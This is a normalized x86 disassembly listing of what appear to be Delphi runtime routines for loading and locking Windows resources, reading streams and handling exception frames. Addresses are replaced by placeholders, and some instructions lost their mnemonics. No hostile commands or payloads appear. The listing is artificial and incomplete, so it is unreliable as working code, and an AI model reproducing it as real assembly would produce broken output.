mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_416938
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_4166d0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
call sub_416938
pop ecx
sub_416a14
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_406c18
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403334
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_416a64
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_4026f4
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_416aac
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_402714
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_416bb0
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_4040e8
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_4040e8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_416c08
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_404184
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_4045f4
mov al 0x1
inc ebx
sub_416c60
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_416cd7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4057e0
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_41176c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416cde
lea eax [ ebp - 0x4 ]
call sub_4057e0
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_41107c
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_4057e0
mov ecx eax
mov eax esi
pop edx
call sub_40d6d4
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_4057e0
sub_416ce4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_416d8a
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416d91
lea eax [ ebp - 0x8 ]
call sub_404094
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_404184
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_41a2b8
mov esi eax
test esi esi
jne r-xdata
add dl 0xd3
sub dl 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_407fcc
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_416dac
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_414418
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_414418
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_414210
sub_416de4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_414418
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_414418
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_41425c
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_414210
sub_416e2c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_416fc5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
call sub_414764
mov edi eax
xor edx edx
push ebp
push sub_416fa6
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416fad
mov eax [ rw-data ]
call sub_4147c8
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_416f87
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_416f35
push [ fs : edx ]
mov [ fs : edx ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_4143bc
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_413eb8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416f3c
mov eax [ ebp - 0x8 ]
call sub_403344
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_4111a8
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_416dac
pop ecx
mov edx esi
mov eax edi
call sub_41425c
mov eax ebx
call sub_403344
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_416ce4
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
push ebp
mov eax [ ebx + 0x4 ]
call sub_416de4
pop ecx
inc esi
sub_416f3c
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403344
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4143bc
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
sub_416fd4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_414764
mov edi eax
xor eax eax
push ebp
push sub_41706f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4147c8
retn
mov edx ebx
mov eax edi
call sub_4143bc
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_41425c
mov eax esi
call sub_403344
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_407fcc
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_417080
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_414764
mov edi eax
xor eax eax
push ebp
push sub_4170f7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4147c8
retn
mov edx ebx
mov eax edi
call sub_4143bc
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_41425c
mov eax esi
call sub_403344
sub_417128
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdb4
call sub_403ad0
pop ecx
pop edx
pop ebx
retn
sub_41716c
push ebx
push esi
push edi
call sub_4036d0
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_416aac
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_4171a8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_419080
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_419190
call sub_41711c
sub_4171cc
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_407fcc
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x70 ]
call sub_404094
sub_417200
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_407fcc
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_419080
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4172c1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_417644
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_417644
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4172c8
mov eax [ ebp - 0x8 ]
call sub_403344
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_419190
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
call sub_41711c
sub_4172f0
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_417310
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_404330
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_4035c8
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_41711c
sub_417378
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_414764
mov esi eax
xor edx edx
push ebp
push sub_4173e8
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4173ef
mov eax [ rw-data ]
call sub_4147c8
retn
mov edx ebx
mov eax esi
call sub_4143bc
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_403344
mov edx ebx
mov eax esi
call sub_41425c
sub_4173f4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_417503
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41750a
lea eax [ ebp - 0x8 ]
call sub_404094
retn
xor edx edx
push ebp
push sub_4174e6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_417538
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_416c08
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4143bc
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x14 ]
call sub_40412c
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_416ce4
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4143bc
call sub_417378
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4143bc
mov edx eax
mov eax [ rw-data ]
call sub_4146dc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_4144b0
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_417514
push ebx
mov ebx eax
mov eax ebx
call sub_417608
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_416070
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_417538
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_403344
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_4143bc
call sub_403344
inc edi
dec esi
jne r-xdata
sub_417574
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_40328c
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_4139cc
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov eax ebp
call sub_4032d0
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_413a44
mov edi eax
mov edx [ esp + 0x4 ]
call sub_413944
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_4032a8
test al al
jne r-xdata
sub_417644
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_417690
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_417690
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd78
call sub_403ad0
sub_4176e0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41772b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_418ee0
mov eax [ ebp - 0x4 ]
call sub_404354
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417732
lea eax [ ebp - 0x4 ]
call sub_404094
retn
call sub_41711c
sub_417738
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_4177d8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4172dc
test al al
jne r-xdata
mov eax ebx
call sub_4172dc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_414c30
jmp r-xdata
mov eax ebx
call sub_417620
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_418248
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4177df
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_414c10
mov esi eax
mov eax ebx
call sub_418240
jmp r-xdata
mov eax ebx
call sub_418190
mov eax ebx
call sub_4172dc
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4183ac
mov eax ebx
call sub_418248
sub_417808
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404f08
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_414210
inc esi
dec ebx
jne r-xdata
sub_417844
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_41a3d4
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404f08
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4050c4
add esp 0x4
mov edx ebx
mov eax edi
call sub_41a3a8
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404f08
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_41a3a8
test [ eax + 0x24 ] 0x4
je r-xdata
sub_4178bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404f08
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_417924
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_417944
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_402784
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_417924
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_419374
call sub_402784
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_403344
sub_4179a4
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_417a8a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_419514
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x6c ]
call [ esi + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_417a5e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_417a8f
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_417944
pop ecx
test al al
jne r-xdata
call sub_403b4c
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403af8
sub_417ab4
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_417b2c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_403540
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_413eb8
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_417b31
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_417944
pop ecx
test al al
jne r-xdata
call sub_403b4c
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403af8
sub_417b54
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_417bcf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_419514
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_403540
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
